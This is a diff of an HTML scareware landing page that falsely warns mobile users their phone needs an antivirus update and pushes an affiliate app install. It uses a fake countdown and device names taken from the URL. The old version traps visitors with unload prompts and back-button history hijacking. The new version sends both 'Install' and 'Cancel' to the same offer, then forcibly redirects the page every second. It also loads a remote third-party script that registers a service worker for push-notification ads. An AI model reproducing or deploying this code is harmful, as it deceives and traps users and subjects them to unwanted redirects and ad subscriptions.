@@ -1,15 +1,10 @@
 <!DOCTYPE html><html><head>
   <base href="">
-
-  
-
     <title>Update!</title>
-  
-  
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#999">
-    <link id="favicon" href="icon.png" rel="shortcut icon" type="image/x-icon">
+    <link id="favicon" href="./icon.png" rel="shortcut icon" type="image/x-icon">
     <style type="text/css">html {
         font-family: sans-serif;
         -ms-text-size-adjust: 100%;
@@ -812,19 +807,44 @@
     </style>
 
 <script>
+
+    function contains(string, fragment) {
+        string = string.toLowerCase();
+        fragment = fragment.toLowerCase();
+        return string.indexOf(fragment) !== -1;
+    }
+
+    function getURLParameter(name) {
+        var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+
+        if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
+            result = 'Phone'
+        }
+
+        if(name.indexOf('model') !== -1 && contains(result, 'android')) {
+            result = 'Phone'
+        }
+
+        if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+            result = 'Internet Browser'
+        }
+
+        if(result==null||result==""){
+            result = 'Phone'
+        }
+
+        return result;
+
+    }
+
     var device_brand = getURLParameter('device_brand');
     var device_model = getURLParameter('device_model');
   
-    function getURLParameter(name) {
-        return decodeURIComponent(
-            (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
-        );
-    }
     </script>
 
 </head>
 <body class="en ltr">
-<div id="myModal" class="modal" style="display: block;">
+<div id="myModal" class="modal" style="display: none;">
 <div class="w3-modal-content w3-animate-top w3-card-4">
   <!-- Modal content -->
   <div class="onesignal-popover-container onesignal-reset slide-down" id="onesignal-popover-container">
@@ -832,7 +852,7 @@
 		<div id="normal-popover">
 			<div class="popover-body">
 				<div class="popover-body-icon">
-					<img alt="notification icon" class="" src="favicon.png">
+					<img alt="notification icon" class="" src="./favicon.png">
 				</div>
 				<div class="popover-body-message">Update your Antivirus right now to improve 
                     performance of your phone and improve 
@@ -840,8 +860,8 @@
 				<div class="clearfix"></div>
 			</div>
 			<div class="popover-footer">
-				<a id="onesignal-popover-allow-button" class="finlink align-right primary popover-button" href="https://app.appsflyer.com/com.psafe.msuite?pid=adsterra_int&amp;c=us_security_non-incent_mobileweb-campaign_cpi&amp;af_cost_currency=USD&amp;af_cost_model=CPI&amp;af_cost_value=2.00&amp;af_click_lookback=1d&amp;clickid=VjN8MTUyMDcyNzB8MjQzMzg1NXw5Nzk3MjV8MTYwMTc1NTg1MXwwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDB8NzUuMzUuMTA0LjUxfDF8cHN1Yj1wb3BhZHN8c2g9MzczNTYyNDViMzNiYzI4N2I5ZTk4NGIyMWEwODE2N2NkNmZkYjQ1ODYwYjRiOGY3MGQ3ZGRkNGQwZWQ5YmE4ZmRmMDc1MTViZWY0Mjc2ZTQ5MGNmYTBkYjVkZDE5Y2Q4OTBjNGYzOTliZWM4Y2M0ZTg4ZDMyMWU4ZDUzMmY0MmRkMThhOWE5NWFkZDk0MzE1OGIyM2RhZmZkYmUyN2JjMjgyZTI1MDkxfDUyNzI3MGY1MGI5NTM0MmFhNTU0NmQ0ZmZjYThmMGIy&amp;af_siteid=15207270&amp;af_sub_siteid=162209">OK</a>
-				<a id="onesignal-popover-cancel-button" class="finlink align-right secondary popover-button" href="https://app.appsflyer.com/com.psafe.msuite?pid=adsterra_int&amp;c=us_security_non-incent_mobileweb-campaign_cpi&amp;af_cost_currency=USD&amp;af_cost_model=CPI&amp;af_cost_value=2.00&amp;af_click_lookback=1d&amp;clickid=VjN8MTUyMDcyNzB8MjQzMzg1NXw5Nzk3MjV8MTYwMTc1NTg1MXwwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDB8NzUuMzUuMTA0LjUxfDF8cHN1Yj1wb3BhZHN8c2g9MzczNTYyNDViMzNiYzI4N2I5ZTk4NGIyMWEwODE2N2NkNmZkYjQ1ODYwYjRiOGY3MGQ3ZGRkNGQwZWQ5YmE4ZmRmMDc1MTViZWY0Mjc2ZTQ5MGNmYTBkYjVkZDE5Y2Q4OTBjNGYzOTliZWM4Y2M0ZTg4ZDMyMWU4ZDUzMmY0MmRkMThhOWE5NWFkZDk0MzE1OGIyM2RhZmZkYmUyN2JjMjgyZTI1MDkxfDUyNzI3MGY1MGI5NTM0MmFhNTU0NmQ0ZmZjYThmMGIy&amp;af_siteid=15207270&amp;af_sub_siteid=162209"> Close</a>
+				<a id="onesignal-popover-allow-button" class="finlink align-right primary popover-button" onclick="ctaclick();" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2">OK</a>
+				<a id="onesignal-popover-cancel-button" class="finlink align-right secondary popover-button" onclick="ctaclick();" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2"> Close</a>
 				<div class="clearfix"></div>
 			</div>
 		</div>		
@@ -854,7 +874,7 @@
 	function showm(){
 		var modal = document.getElementById("myModal");
 		modal.style.display = "block";
-		var iconNew = 'icon.png';
+		var iconNew = './icon.png';
 		document.getElementById('favicon').href = iconNew;
 	}	
 	function hidem(){
@@ -887,22 +907,20 @@
 <div class="wrap">
     <div class="window">
         <div class="text">
-
-
-            <h1 style="" class="blink_me">It is recommended that you update the Antivirus for your <script>document.write(getURLParameter("device_brand"))</script>Xiaomi!</h1>
-            <p>Due to the latest problems with <script>document.write(getURLParameter("device_brand"))</script>Xiaomi <script>document.write(getURLParameter("device_model"))</script>MI MAX 2, we have released an update of the dfndr: Antivirus Accelerator which will find all viruses and potential threats and will also clean junk files and improve battery life.</p>
+            <h1 style="" class="blink_me">It is recommended that you update the Antivirus for your <script>document.write(getURLParameter("device_brand"))</script>!</h1>
+            <p>Due to the latest problems with <script>document.write(getURLParameter("device_brand"))</script>, we have released an update of the dfndr: Antivirus Accelerator which will find all viruses and potential threats and will also clean junk files and improve battery life.</p>
             <br>
-            <p>Update right now to boost your <script>document.write(getURLParameter("device_brand"))</script>Xiaomi <script>document.write(getURLParameter("device_model"))</script>MI MAX 2 and improve performance of your phone and improve battery life.</p>
+            <p>Update right now to boost your <script>document.write(getURLParameter("device_brand"))</script> and improve performance of your phone and improve battery life.</p>
             <br>
-            <img src="logo.png" style="width:60px;height:60px;float: left; padding-right: 10px;">
-            <p>Install the recommended app <strong>for FREE</strong> to clean and strengthen your <script>document.write(getURLParameter("device_brand"))</script>Xiaomi immediately!</p>
+            <img src="./logo.png" style="width:60px;height:60px;float: left; padding-right: 10px;">
+            <p>Install the recommended app <strong>for FREE</strong> to clean and strengthen your <script>document.write(getURLParameter("device_brand"))</script> immediately!</p>
             <p style="text-align:center;margin-top:10px;"><span style="font-size:15px;color:red;font-family:sans-serif;" id="theTime">5 minutes 43 seconds</span></p>
         </div>
         <div class="buttons">
-            <button onclick="exit()" class="button exitpoint">
+            <button onclick="ctaclick();" class="button exitpoint">
 				<span>Install</span>
             </button>
-            <button onclick="exit()" class="button cancel">
+            <button onclick="ctaclick();" class="button cancel">
 				<span>Cancel</span>
             </button>			
         </div>
@@ -911,49 +929,37 @@
 </div>
 
 
-<script type="text/javascript">
-    var fin_link = decodeURIComponent(getURLParameter('p1'));
-    var links = document.getElementsByClassName('finlink');
-    for (var i = 0; i < links.length; i++) links[i].setAttribute("href", fin_link);
-
-    for (var j = 0; j < links.length; j++) {
-        links[j].addEventListener('click', function() {
-            window.onbeforeunload = null;
-        });
+<script>
+    function ctaclick(){
+      window.onbeforeunload = null;
+      window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+      
+      setInterval(afflowsmartlink, 1000);
+    }
+    
+    function afflowsmartlink(){
+      location.replace("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2");
     }
 
-    function getURLParameter(name) {
-        return decodeURIComponent(
-            (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
-        );
-    }
-    window.onbeforeunload = function(e) {
-        if (true) {
-            s = 'All unsaved data will be lost! Do you really want to quit the site?'
-            e = e || window.event;
-            // For IE and Firefox prior to version 4
-            if (e) {
-                e.returnValue = s;
-            }
-            // For Safari
-            return s;
-        }
-    };
-    //Historyback
-    ! function() {
-        var t;
-        try {
-            for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
-            onpopstate = function(t) {
-                window.onbeforeunload = null;
-                t.state && location.replace(fin_link);
-            };
-        } catch (o) {}
-    }();
-    function exit(){
-		window.location = fin_link
-	}
 </script>
+
+<script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//bigrourg.net/pfe/current/micro.tag.min.js?z=4978561'+'&ymid='+pci+'&sw=/sw-check-permissions-3b3e2.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+  </script>
+
 
 
 </body></html>
